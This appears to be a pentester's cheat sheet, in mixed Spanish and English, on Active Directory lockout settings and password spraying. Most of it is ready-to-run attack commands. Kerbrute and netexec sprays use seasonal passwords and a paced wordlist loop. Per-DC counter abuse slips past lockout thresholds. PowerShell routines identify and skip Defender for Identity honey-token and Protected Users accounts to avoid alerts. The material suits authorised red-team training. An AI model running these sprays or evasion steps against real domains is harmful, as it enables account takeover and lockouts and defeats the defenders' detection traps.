---
aliases:
  - Lockout Threshold
  - Spray Window
  - Bad Password Count
  - Reverse Spray
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Password Policy Enumeration]]"
---
# AD - Password Policy Enumeration - Lockout & Brute Force Implications

***

## Lockout Mechanics

| **Atributo** | **Significado** | **Impact spray** |
|:---:|:---:|:---:|
| `lockoutThreshold` | Bad attempts antes de lock (0 = sin lockout) | 0 = spray ilimitado. |
| `lockoutDuration` | Tiempo de lock (-1 = manual unlock) | Spray pacing. |
| `lockoutObservationWindow` | Ventana donde counter persiste | Reset counter después. |
| `badPwdCount` | Counter actual del user (per-DC, no replicado) | Pre-spray check. |
| `badPasswordTime` | Last bad attempt timestamp | Detect activity. |
| `lockoutTime` | Lockout timestamp (0 = no lockeado) | Estado actual. |
^ad-lockout-mechanics

**Caveat clave:** `badPwdCount` es **per-DC** (no replicado). Spray contra DC distinto cada N attempts = bypass parcial del threshold. Mismo user × `<lockoutThreshold>` attempts en cada DC = lockout total cuando suma replicada vía PDC.

```powershell
# Policy completo
$p = Get-ADDefaultDomainPasswordPolicy
"Threshold: $($p.LockoutThreshold) | Duration: $($p.LockoutDuration) | Window: $($p.LockoutObservationWindow)"
```

___

## Spray Window Calculation

| **Cálculo** | **Fórmula** | **Resultado típico** |
|:---:|:---:|:---:|
| Safe attempts per user | `lockoutThreshold - 1` | 4 si threshold=5. |
| Pacing entre attempts | `> lockoutObservationWindow` | >30min. |
| Max safe rate | `(threshold-1) attempts cada (window+1) min` | 4 / 31min = 1 every ~8min. |
| Per-DC parallelism | `attempts × num_DCs` (counter per-DC pre-replicación) | 4 × 3 DCs = ~12 antes de PDC sync. |
^ad-lockout-spray

```bash
# Safe spray con kerbrute (1 password vs many users)
kerbrute passwordspray --dc <DC> -d corp.local users.txt 'Spring2026!' --delay 100

# Spray con netexec (controlado)
nxc smb <DC> -u users.txt -p 'Spring2026!' --continue-on-success

# Pacing manual con sleep
while read u; do
  nxc smb <DC> -u "$u" -p 'Spring2026!' 2>&1 | grep -E "FAIL|SUCC"
  sleep 8
done < users.txt
```

___

## Reverse Spray (1 password × N users)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute passwordspray --dc <DC> -d corp.local users.txt 'Welcome2026!'` | 1 pwd contra N users | Standard reverse spray. |
| `nxc smb <DC> -u users.txt -p 'Welcome2026!' --continue-on-success` | Spray vía netexec SMB | Alt. |
| `nxc ldap <DC> -u users.txt -p 'Welcome2026!' --continue-on-success` | Spray LDAP (menos noisy) | OPSEC. |
| `nxc winrm <DC> -u users.txt -p 'Welcome2026!'` | Spray WinRM | Si WinRM open. |
| `DomainPasswordSpray.ps1 -Password 'Welcome2026!'` (PowerShell) | Native PS spray | Sin tools externos. |
^ad-lockout-reversespray

**Por qué funciona:** `badPwdCount` se incrementa por **failed attempt per user**. Spray "1 password × N users" = 1 attempt per user = nunca llega a threshold. Mucho más seguro que brute force tradicional.

```bash
# Wordlist típico de spray (estacional)
for w in "Spring2026!" "Summer2026!" "Welcome2026!" "Password1" "Changeme1!" "<Company>2026!"; do
  echo "=== $w ==="
  kerbrute passwordspray --dc <DC> -d corp.local users.txt "$w"
  sleep 1800   # 30min entre attempts
done
```

___

## Bad Password Count Tracking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser <user> -Properties badPwdCount,badPasswordTime,lockoutTime` | Counter + last attempt + estado | Pre-spray check. |
| `Get-ADUser <user> -Server <DC1> -Pr badPwdCount; Get-ADUser <user> -Server <DC2> -Pr badPwdCount` | Counter per-DC (no replicado) | Multi-DC awareness. |
| `Search-ADAccount -LockedOut` | Users actualmente lockeados | Triage. |
| `nxc ldap <DC> -u u -p p --query "(badPwdCount>=3)" "samAccountName,badPwdCount"` | Filter users con counter alto | Pre-spray (evitar). |
^ad-lockout-badcount

**Para evitar lockout:**
1. Pre-spray: skip users con `badPwdCount >= threshold-1`.
2. Post-spray: recheck `badPwdCount` para confirmar no lockeados.
3. `lockoutTime != 0` → user lockeado.

```powershell
# Audit pre-spray — skip users cerca del lockout
$threshold = (Get-ADDefaultDomainPasswordPolicy).LockoutThreshold
$safeUsers = Get-ADUser -Filter {Enabled -eq $true} -Properties badPwdCount,lockoutTime |
  Where { $_.badPwdCount -lt ($threshold - 1) -and $_.lockoutTime -eq 0 } |
  Select -Expand SamAccountName

$safeUsers | Out-File safe_targets.txt
```

___

## Pre-Spray Validation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt` | Validar users existen (sin auth) | Pre-spray dedupe. |
| `(Get-ADDefaultDomainPasswordPolicy).LockoutThreshold` | Threshold actual | Cálculo safe attempts. |
| `(Get-ADDefaultDomainPasswordPolicy).LockoutObservationWindow` | Window | Pacing. |
| `Get-ADFineGrainedPasswordPolicy -Filter * \| Select Name,LockoutThreshold,AppliesTo` | PSOs con threshold custom | Different policy per group. |
| `Get-ADUserResultantPasswordPolicy <target>` | Policy efectivo del user target | Per-user spray strategy. |
^ad-lockout-prespray

**Pipeline pre-spray:**
1. `kerbrute userenum` → valid users only.
2. Check threshold (DDP + PSOs).
3. Filter `badPwdCount` proximity.
4. Identify honeypots (siguiente).
5. Spray con `(threshold - 2)` attempts max + pacing.

___

## Honeypot Account Detection

| **Comando** | **Qué detecta** | **Indicador honeypot** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter * -Pr description,whenCreated,LogonCount,LastLogonDate \| ? {$_.LogonCount -eq 0 -and $_.whenCreated -lt (Get-Date).AddDays(-180)}` | Accounts nunca usados >180d (honey candidates) | Sin actividad real. |
| `Get-ADUser -Filter {AdminCount -eq 1 -and LogonCount -eq 0}` | Priv users sin logon | Trampa MDI. |
| `Get-ADUser -Filter * -Pr description \| ? Description -match "(?i)honey\|tripwire\|trap\|monitor"` | Description con keywords | Defender lazy. |
| `Get-ADUser -Filter * -Pr whenCreated,whenChanged,LogonCount \| ? {$_.LogonCount -eq 0 -and ($_.whenCreated -ne $_.whenChanged)}` | Creado y modificado pero nunca usado | Sospechoso. |
^ad-lockout-honeypot

**Por qué evitar:** MDI (Microsoft Defender for Identity) deploy honey-tokens. Login attempt → alerta inmediata + IR escalation. Identificar antes de spray.

```powershell
# Honey-token candidates — skip de spray list
Get-ADUser -Filter {Enabled -eq $true -and AdminCount -eq 1} `
  -Properties LogonCount,LastLogonDate,whenCreated,Description |
  Where { $_.LogonCount -eq 0 -or $_.LastLogonDate -eq $null } |
  Select Name,SamAccountName,whenCreated,Description,LogonCount
```

___

## Per-User Lockout Variations

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser <u> -Pr msDS-ResultantPSO` | PSO efectivo del user (override DDP) | Per-user policy. |
| `Get-ADUserResultantPasswordPolicy <user>` | Resultant policy completo | Spray strategy per-user. |
| `Get-ADGroupMember "Protected Users" -Recursive` | Users en Protected Users (pre-auth + AES + 4h TGT) | Skip list. |
| `Get-ADUser -Filter {LockedOut -eq $true}` | Users actualmente lockeados | Triage. |
^ad-lockout-peruser

**Protected Users group:** miembros tienen TGT lifetime 4h, no NTLM auth, no DES/RC4. Spray contra ellos = más detectable.

```powershell
# Build comprehensive spray exclusion list
$Skip = @()

# Honey candidates
$Skip += (Get-ADUser -Filter {LogonCount -eq 0 -and Enabled -eq $true} -Pr LogonCount).SamAccountName

# Protected Users
$Skip += (Get-ADGroupMember "Protected Users" -Recursive -EA SilentlyContinue).SamAccountName

# Already locked
$Skip += (Search-ADAccount -LockedOut).SamAccountName

# Near-threshold
$th = (Get-ADDefaultDomainPasswordPolicy).LockoutThreshold
$Skip += (Get-ADUser -Filter {Enabled -eq $true} -Pr badPwdCount | ? badPwdCount -ge ($th - 1)).SamAccountName

$Skip | Sort -Unique | Out-File spray_skip.txt
```

***
